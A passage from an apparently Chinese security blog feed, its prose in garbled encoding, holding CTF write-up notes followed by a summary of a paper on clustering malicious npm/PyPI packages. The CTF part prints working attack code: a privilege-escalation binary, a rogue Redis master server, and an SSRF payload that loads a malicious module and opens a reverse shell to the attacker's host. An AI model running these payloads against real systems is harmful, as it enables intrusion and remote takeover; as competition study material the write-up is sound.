./11.txtæœç´¢flag</p></li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202145919.(null)" alt="img"></p><h1 id="å¼ºç½‘å…ˆé”‹"><a href="#å¼ºç½‘å…ˆé”‹" class="headerlink" title="å¼ºç½‘å…ˆé”‹"></a>å¼ºç½‘å…ˆé”‹</h1><ol><li><p>æ–‡ä»¶æ‰«æåˆ°<a href="http://www.zipè·å–åˆ°æºç /">www.zipè·å–åˆ°æºç </a></p></li><li><p>ä¸Šä¼ incæ–‡ä»¶ï¼Œåˆ©ç”¨spl_autoload_registerè¿›è¡Œæ–‡ä»¶åŒ…å«</p></li><li><p>æ„é€ ååºåˆ—åŒ–ï¼Œæ‹¿flag</p></li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202227511.(null)" alt="img"></p><h1 id="DSCTFå†³èµ›"><a href="#DSCTFå†³èµ›" class="headerlink" title="DSCTFå†³èµ›"></a>DSCTFå†³èµ›</h1><blockquote><p>æ‡’å¾—é‡å¼€ä¸€ä¸ªæ–‡æ¡£äº†ï¼Œè®°å½•åœ¨è¿™é‡Œ</p></blockquote><h2 id="safe-script-new"><a href="#safe-script-new" class="headerlink" title="safe_script_new"></a>safe_script_new</h2><ol><li>é˜…è¯»æºç ï¼Œåˆ©ç”¨php://filterå†™ä¸ªé©¬è¿›å»</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339023.(null)" alt="img"></p><ol><li>/flagæƒé™åªæœ‰rootå¯è¯»ï¼Œç¿»æ‰¾suidæ— æœï¼Œpså‘ç°æœ‰rootè¿è¡Œçš„ç¨‹åºï¼Œè¯¥ç¨‹åºå…¶ä»–ç”¨æˆ·å¯è¯»ï¼Œå°±è¯»ä¸€ä¸‹</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def get_version(program):</span><br><span class="line">    pid = program[1]</span><br><span class="line">    try:</span><br><span class="line">        exe_path = &quot;/proc/&quot; + pid + &quot;/exe&quot;</span><br><span class="line">        program_path = subprocess.check_output([&quot;su&quot;,&quot;-l&quot;,program[0],&quot;-s&quot;,&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,f&quot;readlink &#123;exe_path&#125;&quot;], timeout=1).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">        print(program, &quot;/proc/&quot; + pid + &quot;/exe&quot;, program_path)</span><br><span class="line">        return subprocess.check_output([program_path, &#x27;--version&#x27;], timeout=1).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return None</span><br><span class="line">def get_process_list():</span><br><span class="line">    try:</span><br><span class="line">        process_list = []</span><br><span class="line">        raw = subprocess.check_output([&#x27;ps&#x27;, &#x27;-ef&#x27;]).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">        # raw = open(&quot;a.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">        lines =  raw.split(&#x27;\n&#x27;)</span><br><span class="line">        for line in lines:</span><br><span class="line">            if line.startswith(&#x27;UID&#x27;):</span><br><span class="line">                continue</span><br><span class="line">            data = re.findall(r&#x27;^([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+([^\x20]+)\x20+(.+?)$&#x27;, line)</span><br><span class="line">            if len(data) &gt; 0:</span><br><span class="line">                data = data[0]</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">            print(data, data[-1])</span><br><span class="line">            if &quot;java&quot; in data[-1]:</span><br><span class="line">                process_list.append(data)</span><br><span class="line">        return process_list</span><br><span class="line">    except subprocess.CalledProcessError:</span><br><span class="line">        return None</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            processes = get_process_list()</span><br><span class="line">            for process in processes:</span><br><span class="line">                get_version(process)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        time.sleep(20)</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´é€»è¾‘å°±æ˜¯ps -efè·å–æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼Œç„¶ååˆ¤æ–­æ‰§è¡Œå‘½ä»¤é‡Œæœ‰æ²¡æœ‰javaå…³é”®å­—ï¼Œæœ‰å°±åŠ å…¥get_versionåˆ—è¡¨ä¸­get_versionä¼šæ ¹æ®è¿›ç¨‹ä¿¡æ¯åˆ©ç”¨readlinkè·å–å½“å‰è¿›ç¨‹exeåŸæœ¬çš„æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¯¥æ–‡ä»¶åŠ --versionå‚æ•°ã€‚</p><ol><li>å†™ä¸ªc++ç¼–è¯‘ä¸€ä¸‹ï¼Œå®Œæˆåè½¯è¿æ¥ä¸º/var/www/html/javaï¼Œè¿™æ—¶å€™ï¼ˆæ³¨æ„éœ€è¦åå¼¹ä¸€ä¸ªshellå›æ¥ï¼‰aliasèµ·ä¸ªåˆ«åï¼Œaliasçš„ä¼˜å…ˆçº§æ˜¯é«˜äº$PATHçš„ï¼Œä½†æ˜¯ä½äºhashï¼Œä¸è¿‡ä¼¼ä¹è¿™é‡Œæ²¡æœ‰è€ƒå¯Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦ä½¿ç”¨sleepè®©è¯¥ç¨‹åºæŒ‚èµ·ç­‰å¾…rootèµ·çš„è„šæœ¬è¿‡æ¥è¿è¡Œã€‚ç»†èŠ‚å¦‚ä¸‹å›¾</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">  int main()</span><br><span class="line">  &#123;  </span><br><span class="line">    system(&quot;cat /flag &gt; /var/www/html/111.txt&quot;);</span><br><span class="line">    sleep(300);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339156.(null)" alt="img"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202339310.(null)" alt="img"></p><h2 id="ez-java-new"><a href="#ez-java-new" class="headerlink" title="ez_java_new"></a>ez_java_new</h2><blockquote><p>ä¸æƒ³å†™äº†å«–ä¸€ä¸‹r3é¸½é¸½çš„</p></blockquote><p>redisä¸»ä»æ”»å‡»</p><p>è®¿é—®/actuator/heapdumpæ‹¿åˆ°heapdumpï¼Œç”¨Matæ‰“å¼€ï¼ŒOQLæŸ¥è¯¢</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500286.(null)" alt="img"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500489.(null)" alt="img"></p><p>æ‹¿åˆ°redis.password</p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>makeï¼Œæ‹¿åˆ°ä¸€ä¸ªæ¶æ„so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">payload=<span class="built_in">open</span>(<span class="string">&quot;exp.so&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">exp_filename=<span class="string">&quot;exp.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span>(<span class="params">lport</span>):</span></span><br><span class="line">    <span class="keyword">global</span> CRLF</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket()</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    clientSock, address = sock.accept()</span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        data = clientSock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">&quot;+PONG&quot;</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">&quot;+OK&quot;</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            result = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CRLF</span><br><span class="line">            result += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CRLF</span><br><span class="line">            result = result.encode()</span><br><span class="line">            result += payload</span><br><span class="line">            result += CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;done&quot;</span></span><br><span class="line"></span><br><span class="line">RogueServer(<span class="number">6378</span>)</span><br></pre></td></tr></table></figure><p>åœ¨vpsä¸Šç›‘å¬6378ç«¯å£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AUTH enw!BKT_hac*pev9nvj</span></span><br><span class="line"><span class="string">SLAVEOF ip 6378</span></span><br><span class="line"><span class="string">config set dbfilename exp.so</span></span><br><span class="line"><span class="string">MODULE LOAD ./exp.so</span></span><br><span class="line"><span class="string">system.rev ip 7777</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload</span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br></pre></td></tr></table></figure><p>Post: url=<payload></p><p>ç›‘å¬7777ç«¯å£ï¼Œæ¥æ”¶åˆ°shell</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/(null)-20220801202500699.(null)" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Supporting the Detection of Software Supply Chain Attacks through Unsupervised Signature Generation</title>
      <link href="/2022/07/25/Supporting%20the%20Detection%20of%20Software%20Supply%20Chain%20Attacks%20through%20Unsupervised%20Signature%20Generation/"/>
      <url>/2022/07/25/Supporting%20the%20Detection%20of%20Software%20Supply%20Chain%20Attacks%20through%20Unsupervised%20Signature%20Generation/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šM Ohm, L Kempf, F Boes, M Meier</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šSupporting the Detection of Software Supply Chain Attacks through Unsupervised Signature Generation</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://arxiv.org/pdf/2011.02235.pdf">https://arxiv.org/pdf/2011.02235.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šPREPRINT</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>ç°ä»£è½¯ä»¶å¼€å‘æ˜¯ç«™åœ¨å¤§é‡ç¬¬ä¸‰æ–¹å·¥å…·ã€åº“å’Œè½¯ä»¶åŒ…çš„åŸºç¡€ä¸Šçš„ä¸€é¡¹å·¥ä½œã€‚é€šå¸¸æ¥è¯´ï¼Œç”±å®˜æ–¹ç»´æŠ¤çš„æ³¨å†Œè¡¨ï¼ˆnpmã€PyPIï¼‰åœ¨æ•´ä¸ªè½¯ä»¶åŒ…ç”Ÿæ€ä¸­æ‰®æ¼”ç€æœ€ä¸ºæ ¸å¿ƒçš„è§’è‰²ã€‚é‚£ä¹ˆç«™åœ¨æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œé’ˆå¯¹å¼€æºè½¯ä»¶åŒ…ä»“åº“è¿›è¡ŒæŠ•æ¯’ï¼ˆå‘å¸ƒæ¶æ„åŒ…ï¼‰æ˜¯ä¸€é¡¹æ—¢æœ‰æ•ˆä¹Ÿååˆ†èŠ‚çœæˆæœ¬çš„æ”»å‡»æ–¹æ³•ã€‚ä½œè€…ç»™å‡ºäº†ä¸‰ä¸ªä¸»è¦åœºæ™¯ä¾‹å­ï¼š  </p><ol><li>å¼€æºè½¯ä»¶åŒ…å¸¸ç”¨äºæ„æˆå„ç§è½¯ä»¶é¡¹ç›®ï¼Œä½†è½¯ä»¶åŒ…çš„ä»£ç åº“ä¸å¤ªå¯èƒ½ç”±è½¯ä»¶åŒ…ç”¨æˆ·è¿›è¡Œå®¡æŸ¥ï¼›</li><li>å¤§å¤šæ•°è½¯ä»¶åŒ…å­˜å‚¨åº“æ²¡æœ‰ä½¿ç”¨æœ‰æ•ˆçš„æ¶æ„è½¯ä»¶åŒ…æ£€æµ‹æ–¹æ³•ï¼Œå¤§å¤šæ¶æ„åŒ…éœ€è¦200å¤©å·¦å³çš„æ—¶å€™æ‰èƒ½è¢«è¯†åˆ«å’Œåˆ é™¤ï¼›</li><li>ç”±äºç¼ºä¹æœ‰æ•ˆçš„æ¶æ„è½¯ä»¶åŒ…æ£€æµ‹æ–¹æ³•ï¼Œæ¶æ„è½¯ä»¶åŒ…ä½œè€…å¯ä»¥é‡æ–°å‘å¸ƒç•¥å¾®ä¿®æ”¹è¿‡çš„æ¶æ„ä»£ç ç‰‡æ®µï¼Œä»¥æ­¤ç»•è¿‡æ£€æµ‹ã€‚  </li></ol><p>æŒ‰ç…§ä¼ ç»Ÿçš„ä¸ŠæŠ¥ã€æ¯”å¯¹ã€å½’ç±»çš„æ–¹å¼å¤„ç†æ¶æ„è½¯ä»¶åŒ…éš¾ä»¥åº”å¯¹æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨æŸ¥è¯¢å·²æœ‰æ¶æ„å®¶æ—ï¼ŒåŒæ—¶éœ€è¦ç»´æŠ¤ä¸€ä»½ç›¸å¯¹å¹²å‡€çš„å®¶æ—ç‰¹å¾è¡¨çš„é—®é¢˜ã€‚ä½œè€…äºæœ¬æ–‡ä¸­æä¾›äº†ä¸€ä¸ªå·¥å…·ï¼Œ<strong>ä½¿å®‰å…¨åˆ†æå¸ˆæœ€è€—æ—¶ã€æœ€ç¹ççš„ä»»åŠ¡å˜æˆä¸€é¡¹è‡ªåŠ¨åŒ–çš„ä»»åŠ¡</strong>ã€‚</p><h2 id="0x02-Method"><a href="#0x02-Method" class="headerlink" title="0x02 Method"></a>0x02 Method</h2><p>ä½œè€…Ohmåœ¨å…¶ä¹‹å‰çš„æ–‡ç« ä¸­è§‚å¯Ÿåˆ°ï¼Œæ¶æ„è½¯ä»¶åŒ…é€šå¸¸å…·æœ‰å…±åŒçš„ä¸€äº›ç‰¹å¾ä»£ç ç‰‡æ®µï¼Œè¿™ä¹Ÿäºè¯»è€…åœ¨ç ”ç©¶æ—¶å‘ç°çš„å†…å®¹ä¸€è‡´ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ¶æ„è½¯ä»¶åŒ…å‡ºç°ä¸ä¼šæ˜¯å•ç‹¬ä¸€ä¸ªå‘å¸ƒåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œè€Œæ˜¯ä¼šä»¥ä¸€ç§æ‰¹é‡çš„æ–¹å¼è¿›è¡Œå¹¿æ’’ç½‘å¼çš„æ”»å‡»ã€‚å¦‚Introä¸­æè¿°çš„ï¼Œç°åœ¨æ€¥éœ€ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„æ–¹æ³•æ¥è¯†åˆ«å’Œæœç´¢æ‰€è¿°ç‰¹å¾ä»£ç ç‰‡æ®µã€‚ä¸ºæ­¤ï¼Œä½œè€…æä¾›å¹¶è¯„ä¼°äº†å‡ ç§è‡ªåŠ¨åŒ–æ–¹æ³•ï¼Œä»¥ï¼ˆ1ï¼‰ä½¿ç”¨ç‰¹å¾ä»£ç ç‰‡æ®µè‡ªåŠ¨é›†ç¾¤ï¼ˆæ½œåœ¨æ¶æ„è½¯ä»¶åŒ…ï¼‰ï¼›ï¼ˆ2ï¼‰åˆ©ç”¨ç»“æœæ£€æµ‹å½“å‰æœªè¯†åˆ«çš„å·²çŸ¥æ¶æ„åŒ…å…‹éš†åŒ…ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/beebe43e-fe6e-4b7b-b52c-1f11cad45b74.png"></p><p>ä½œè€…è®¾è®¡äº†ä¸€ç§è‡ªåŠ¨åŒ–æ ‡è®°æ–¹æ³•ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚é¦–å…ˆï¼Œå°†æ¯ä¸ªåŒ…åµŒå…¥åˆ°<a href="https://zhuanlan.zhihu.com/p/54041981">åº¦é‡ç©ºé—´</a>ä¸­ï¼Œå³å°†æ¯ä¸€ä¸ªè½¯ä»¶åŒ…ç”¨ä¸€ä¸ªç‚¹ï¼ˆå¤šä¸ªç‚¹æ„æˆçš„ç‚¹äº‘ï¼‰è¿›è¡Œè¡¨ç¤ºï¼Œæ¯å¯¹ç‚¹ä¹‹é—´éƒ½æœ‰ç²¾ç¡®çš„è·ç¦»ã€‚ç„¶åï¼Œåˆ©ç”¨ç‚¹ä¸ç‚¹ä¹‹é—´çš„è·ç¦»è®¡ç®—é›†ç¾¤ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæ ¹æ®ä¸“å®¶æ‰‹åŠ¨é›†ç¾¤ï¼ˆåœ¨å¸¦æ ‡è®°çš„æ•°æ®é›†ä¸Šï¼‰å¯¹å„ç§åµŒå…¥å’Œé›†ç¾¤è½¯ä»¶åŒ…çš„æ–¹æ³•è¿›è¡Œè¯„ä¼°ã€‚ä½¿ç”¨é›†ç¾¤ä»£è¡¨ä¸€ç»„å…±äº«ç‰¹å¾æ¶æ„ä»£ç ç‰‡æ®µçš„æ¶æ„è½¯ä»¶åŒ…ï¼Œç„¶åä»æ¯ä¸ªé›†ç¾¤ä¸­æå–ä¸€ç»„ç‰¹å¾ä»£ç ç‰‡æ®µï¼Œç”¨äºç”Ÿäº§é›†ç¾¤ç­¾åã€‚</p><h3 id="0x021-Syntactic-Clones"><a href="#0x021-Syntactic-Clones" class="headerlink" title="0x021 Syntactic Clones"></a>0x021 Syntactic Clones</h3><p>Walkerç­‰äººå®šä¹‰äº†å››ç§ä¸åŒæˆéƒ½ç›¸å…³çš„å…‹éš†ç±»å‹ã€‚Type-1å…‹éš†å…±äº«ä¸¤ä¸ªç›¸åŒçš„ä»£ç ç‰‡æ®µï¼Œä½†ä¸æ¶‰åŠç©ºæ ¼ã€ç©ºç™½æˆ–æ³¨é‡Šã€‚Type-2å…‹éš†æŒ‡çš„æ˜¯ä»£ç ç»“æ„ç›¸åŒï¼Œä½†ä¸€äº›å‡½æ•°ã€ç±»æˆ–å˜é‡è¢«é‡å‘½åã€‚Type-3å…‹éš†åœ¨å‘½åä¸åŒçš„åŸºç¡€ä¸Šï¼Œå­˜åœ¨ç€ç»“æ„æ€§çš„å·®å¼‚ï¼Œå³ä»£ç ç‰‡æ®µå¯èƒ½è¢«ä¿®æ”¹ã€‚Type-4å…‹éš†åˆ™æ˜¯æŒ‡çš„æ— æ³•è§‚å¯Ÿåˆ°è¯­æ³•ç›¸ä¼¼æ€§ï¼Œä½†å‡½æ•°ç›¸åŒã€‚</p><h3 id="0x022-Embedding-of-Packages"><a href="#0x022-Embedding-of-Packages" class="headerlink" title="0x022 Embedding of Packages"></a>0x022 Embedding of Packages</h3><p>ä¸ºäº†è¯†åˆ«ä»£ç å…‹éš†ã€æ¯”è¾ƒä»£ç ç‰‡æ®µï¼Œä½œè€…é€šè¿‡å­—ç¬¦ä¸²ç›¸ä¼¼æ€§ï¼Œç¨‹åºä¾èµ–å›¾å’ŒæŠ½è±¡è¯­æ³•æ ‘æ¥è®¡ç®—ç›¸ä¼¼æ€§ã€‚ä½œè€…æå–äº†è½¯ä»¶åŒ…æ‰€æœ‰åŠŸèƒ½ä»£ç ç‰‡æ®µï¼Œå®šä¹‰ä¸¤ä¸ªè½¯ä»¶åŒ…ç›¸ä¼¼æ€§æ˜¯ä¸¤ä¸ªè½¯ä»¶åŒ…çš„ä¸¤ä¸ªä»£ç ç‰‡æ®µä¹‹é—´æœ€å°çš„ç¼–è¾‘è·ç¦»ã€‚åœ¨å®é™…å®ç°è¿‡ç¨‹ä¸­ï¼Œä½œè€…æ”¾å¼ƒäº†åˆ©ç”¨PDGè¿›è¡Œè¿›ä¸€æ­¥å®éªŒï¼Œä¸»è¦å› ä¸ºæ€§èƒ½ç“¶é¢ˆã€‚è€Œå­—ç¬¦ä¸²ç›¸ä¼¼æ€§ç”±äºå…¶å‡†ç¡®åº¦ä¸è¶³ç­‰é—®é¢˜ä¹ŸåŒæ ·è¢«æ”¾å¼ƒäº†ã€‚é€šè¿‡å°†æºä»£ç è½¬ä¸ºASTå¯ä»¥å¿½ç•¥å‘½åæ ‡è¯†ç¬¦æ··æ·†å¸¦æ¥çš„å½±å“ï¼Œä»è€Œä¸“æ³¨äºç»“æ„è¡¨ç¤ºä¸Šçš„åŒºåˆ«ã€‚å…·ä½“æ¥è¯´ï¼Œä¸¤ä¸ªASTçš„ç›¸ä¼¼æ€§è¡¨ç°ä¸ºæ ‘çš„ç¼–è¾‘è·ç¦»ã€‚å½“è½¯ä»¶åŒ…Aæ‰€æœ‰å‡½æ•°çš„ASTä¸è½¯ä»¶åŒ…Bæ‰€æœ‰å‡½æ•°çš„ASTè¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒABä¸¤ä¸ªè½¯ä»¶åŒ…çš„ç›¸ä¼¼æ€§æ˜¯å…¶ä¸­æœ€å°çš„ASTæ ‘çš„ç¼–è¾‘è·ç¦»ã€‚ï¼ˆ<em>è¿™é‡Œä¼šä¸ä¼šæœ‰æ’åˆ—ç»„åˆçˆ†ç‚¸é—®é¢˜ï¼Ÿ</em>ï¼‰</p><h3 id="0x023-Clustering-of-Packages"><a href="#0x023-Clustering-of-Packages" class="headerlink" title="0x023 Clustering of Packages"></a>0x023 Clustering of Packages</h3><p>ä½œè€…ä½¿ç”¨Markov Cluster Algorithm(MCL)è¿›è¡Œèšç±»ï¼Œä¸K-Meansç­‰æ–¹æ³•ä¸åŒï¼ŒMCLä¸éœ€è¦å¯¹åŸºç¡€æ•°æ®è¿›è¡Œå…ˆéªŒå‡è®¾ï¼ˆä¸éœ€è¦é¢„å…ˆè®¾å®šæ•°æ®é›†ï¼‰ã€‚å…·ä½“ç®—æ³•å®ç°å¯ä»¥å‚è€ƒ &quot;A cluster algorithm for graphs.&quot; å¯¹æ¯”å®éªŒç»“æœè¡¨å¦‚ä¸‹æ‰€ç¤ºã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/681be44b-77bf-4de9-a84f-de0a05c2f882.png"></p><h3 id="0x024-Derivation-of-Signatures"><a href="#0x024-Derivation-of-Signatures" class="headerlink" title="0x024 Derivation of Signatures"></a>0x024 Derivation of Signatures</h3><p>ä½œè€…ä½¿ç”¨äº†Chilowiczæå‡ºçš„æŒ‡çº¹è¯†åˆ«æ–¹æ³•ï¼Œè€ƒè™‘ä»ASTè¡¨ç¤ºçš„æ¯ä¸ªå‡½æ•°ä¸­å¯¼å‡ºä¸€ä¸ªæŒ‡çº¹ã€‚ä½†ä¸ä¹‹ä¸åŒçš„æ˜¯ï¼Œä½œè€…æ„å»ºçš„å…³è”å­å›¾ä¸“æ³¨äºä»£ç ç‰‡æ®µçš„ç»“æ„ï¼Œä¸¢å¼ƒè¿ç®—ç¬¦ç­‰éç»“æ„ä¿¡æ¯ä¾‹å¦‚a+bå’Œa*bæœ‰ç€ç›¸åŒæŒ‡çº¹ï¼Œè€Œa+(a+a)å’Œ(a+a)+aæœ‰ç€ä¸åŒçš„æŒ‡çº¹ã€‚</p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>ä½œè€…ä¸ºäº†è§£å†³ç°æœ‰å¤§éƒ¨åˆ†æ–¹æ¡ˆåˆ°æœ€åéœ€è¦äººå·¥å®¡æŸ¥åˆ†ç±»æ¶æ„åŒ…çš„æƒ…å†µï¼Œç ”ç©¶ä¸€ç§è‡ªåŠ¨åŒ–æ ‡è®°å½’ç±»çš„æ–¹æ³•ã€‚åŸºäºASTè€ƒè™‘æ¶æ„ä»£ç å®¶æ—å…‹éš†(ç›¸ä¼¼æ€§)ï¼Œè¿™é‡Œä¸»è¦è¿˜æ˜¯é’ˆå¯¹Type-1å’ŒType-2ï¼Œç»“åˆMCLè¿›è¡Œèšç±»ï¼ŒåŒæ—¶ç»“åˆäººå·¥æ‰‹åŠ¨èšç±»ï¼Œå®ç°äº†ä¸€ä¸ªèƒ½å¤Ÿæ¨¡æ‹Ÿäººå·¥å®¡æŸ¥åˆ†ç±»çš„æ¡†æ¶ã€‚è¯»è€…åœ¨è¯»å®Œæ•´ç¯‡æ–‡ç« åå­˜åœ¨è¿™æ ·å‡ 